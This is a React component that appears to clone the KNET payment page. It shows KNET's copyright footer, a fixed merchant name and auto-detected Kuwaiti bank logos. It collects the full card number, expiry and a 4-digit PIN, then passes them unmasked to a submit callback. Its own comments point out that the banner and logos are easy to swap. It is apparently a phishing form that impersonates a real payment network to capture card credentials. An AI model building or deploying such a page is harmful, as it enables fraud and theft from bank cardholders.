'use client';

import React, { useState, useEffect } from 'react';
import '@/styles/knet-payment.css';

interface BankEntry {
  bin: string;
  bank: string;
  logo: string;
}

const BIN_DB: BankEntry[] = [
  {
    bin: '422220',
    bank: 'Warba Bank',
    logo: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="200" height="40"><text x="0" y="28" font-size="20" font-family="Arial" fill="%232b6fb3">Warba</text></svg>',
  },
  {
    bin: '400555',
    bank: 'National Bank of Kuwait',
    logo: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="220" height="40"><text x="0" y="28" font-size="18" font-family="Arial" fill="%23007ac1">NBK</text></svg>',
  },
  {
    bin: '520000',
    bank: 'Gulf Bank',
    logo: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="200" height="40"><text x="0" y="28" font-size="18" font-family="Arial" fill="%23006699">Gulf Bank</text></svg>',
  },
  {
    bin: '426684',
    bank: 'Burgan Bank',
    logo: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="200" height="40"><text x="0" y="28" font-size="18" font-family="Arial" fill="%238b2a2a">Burgan</text></svg>',
  },
  {
    bin: '408999',
    bank: 'Kuwait International Bank',
    logo: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="260" height="40"><text x="0" y="28" font-size="16" font-family="Arial" fill="%23005588">Kuwait Int. Bank</text></svg>',
  },
  {
    bin: '446404',
    bank: 'Ahli United Bank',
    logo: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="180" height="40"><text x="0" y="28" font-size="18" font-family="Arial" fill="%23004b7a">AUB</text></svg>',
  },
  {
    bin: '418875',
    bank: 'Commercial Bank of Kuwait',
    logo: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="240" height="40"><text x="0" y="28" font-size="14" font-family="Arial" fill="%23005577">Commercial BK</text></svg>',
  },
  {
    bin: '438608',
    bank: 'Boubyan Bank',
    logo: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="180" height="40"><text x="0" y="28" font-size="18" font-family="Arial" fill="%23004466">Boubyan</text></svg>',
  },
  {
    bin: '428125',
    bank: 'Kuwait Finance House',
    logo: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="260" height="40"><text x="0" y="28" font-size="14" font-family="Arial" fill="%23003366">Kuwait Finance House</text></svg>',
  },
];

interface PaymentFormProps {
  amount: string;
  onSubmit: (cardData: any) => void;
  isLoading?: boolean;
}

export default function KNetPaymentForm({
  amount,
  onSubmit,
  isLoading = false,
}: PaymentFormProps) {
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [detectedBank, setDetectedBank] = useState<BankEntry | null>(null);
  const [showPreview, setShowPreview] = useState(false);

  const findBin = (bin6: string): BankEntry | null => {
    if (!bin6 || bin6.length < 6) return null;
    return BIN_DB.find((e) => e.bin === bin6) || null;
  };

  const maskCard = (num: string): string => {
    const clean = num.replace(/\s/g, '');
    if (clean.length < 4) return clean;
    const last4 = clean.slice(-4);
    return '•••• •••• •••• ' + last4;
  };

  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 16);
    const formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    setCardNumber(formatted);

    const bin6 = value.slice(0, 6);
    const found = findBin(bin6);
    setDetectedBank(found);
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
      value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    setExpiry(value);
  };

  const handleSubmit = () => {
    const cleanCard = cardNumber.replace(/\s/g, '');
    if (!cleanCard) {
      alert('ادخل رقم البطاقة');
      return;
    }

    const [month, year] = expiry.split('/');
    if (!month || !year) {
      alert('ادخل تاريخ انتهاء الصلاحية');
      return;
    }

    onSubmit({
      cardNumber: cleanCard,
      expiry,
      month,
      year: '20' + year,
      cvv,
      bank: detectedBank?.bank || 'Unknown',
      bin: cleanCard.slice(0, 6),
    });
  };

  const handleClear = () => {
    setCardNumber('');
    setExpiry('');
    setCvv('');
    setDetectedBank(null);
    setShowPreview(false);
  };

  const handleSaveAndShow = () => {
    const cleanCard = cardNumber.replace(/\s/g, '');
    if (!cleanCard) {
      alert('ادخل رقم البطاقة');
      return;
    }
    setShowPreview(true);
  };

  return (
    <div className="knet-container">
      <div className="knet-banner">
        <img
          src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='760' height='150'><rect width='100%' height='100%' fill='%23cfe6fb'/><text x='20' y='90' font-family='Arial' font-size='36' fill='%23004488'>بانر تجريبي</text></svg>"
          alt="banner"
        />
      </div>

      <div className="knet-panel">
        <div className="knet-bank-head">
          <div className="knet-logo-wrap">
            {detectedBank?.logo ? (
              <img src={detectedBank.logo} alt={detectedBank.bank} />
            ) : (
              <div style={{ fontWeight: 700, color: 'var(--accent)' }}>LOGO</div>
            )}
          </div>
          <div>
            <div className="knet-bank-name">
              {detectedBank?.bank || 'غير معروف'}
            </div>
            <div className="knet-meta">Merchant: MyRetailco General Trading Co.</div>
          </div>
        </div>

        <div className="knet-row">
          <label>Amount</label>
          <div style={{ fontWeight: 700 }}>KD {amount}</div>
        </div>

        <div className="knet-row">
          <label htmlFor="card">Card Number</label>
          <input
            id="card"
            type="text"
            inputMode="numeric"
            maxLength={19}
            placeholder="xxxx xxxx xxxx xxxx"
            value={cardNumber}
            onChange={handleCardChange}
            disabled={isLoading}
          />
          <div className="knet-muted-small">
            سيتم كشف البنك تلقائياً بناءً على أول 6 أرقام
          </div>
        </div>

        <div className="knet-two">
          <div className="knet-row" style={{ flex: 1 }}>
            <label htmlFor="exp">Expiration Date</label>
            <input
              id="exp"
              type="text"
              maxLength={5}
              placeholder="MM/YY"
              value={expiry}
              onChange={handleExpiryChange}
              disabled={isLoading}
            />
          </div>
          <div className="knet-row knet-small">
            <label htmlFor="pin">PIN</label>
            <input
              id="pin"
              type="password"
              maxLength={4}
              placeholder="••••"
              value={cvv}
              onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
              disabled={isLoading}
            />
          </div>
        </div>

        <div className="knet-actions">
          <button
            className="knet-btn primary"
            onClick={handleSaveAndShow}
            disabled={isLoading}
          >
            Save & Show
          </button>
          <button
            className="knet-btn"
            onClick={handleClear}
            disabled={isLoading}
          >
            Clear
          </button>
        </div>

        {showPreview && (
          <div className="knet-preview">
            <div className="knet-credit-card">
              <div style={{ display: 'flex', gap: 12, alignItems: 'center', marginBottom: 10 }}>
                <div style={{ width: 90 }}>
                  {detectedBank?.logo ? (
                    <img
                      src={detectedBank.logo}
                      alt={detectedBank.bank}
                      style={{ maxHeight: 40 }}
                    />
                  ) : (
                    <div style={{ fontWeight: 700, color: 'var(--accent)' }}>LOGO</div>
                  )}
                </div>
                <div>
                  <div style={{ fontWeight: 700, color: 'var(--accent)' }}>
                    {detectedBank?.bank || 'غير معروف'}
                  </div>
                  <div className="knet-meta">MyRetailco General Trading Co.</div>
                </div>
              </div>

              <div style={{ marginBottom: 8 }}>
                <div className="knet-meta">Amount</div>
                <div style={{ fontWeight: 700 }}>KD {amount}</div>
              </div>

              <div style={{ marginBottom: 8 }}>
                <div className="knet-meta">Card Number</div>
                <div style={{ fontWeight: 700 }}>{maskCard(cardNumber)}</div>
              </div>

              <div style={{ display: 'flex', gap: 8 }}>
                <div style={{ flex: 1 }}>
                  <div className="knet-meta">Expiration Date</div>
                  <div style={{ fontWeight: 700 }}>{expiry}</div>
                </div>
                <div style={{ width: 120 }}>
                  <div className="knet-meta">PIN</div>
                  <div style={{ fontWeight: 700 }}>{cvv ? '••••' : ''}</div>
                </div>
              </div>
            </div>
          </div>
        )}

        <div className="knet-muted-small">
          يمكنك استبدال بانر أو شعارات البنوك بسهولة عن طريق تعديل src في الأعلى.
        </div>
      </div>

      <footer className="knet-footer">
        All Rights Reserved. Copyright 2024 © - The Shared Electronic Banking Services Company - KNET
      </footer>
    </div>
  );
}
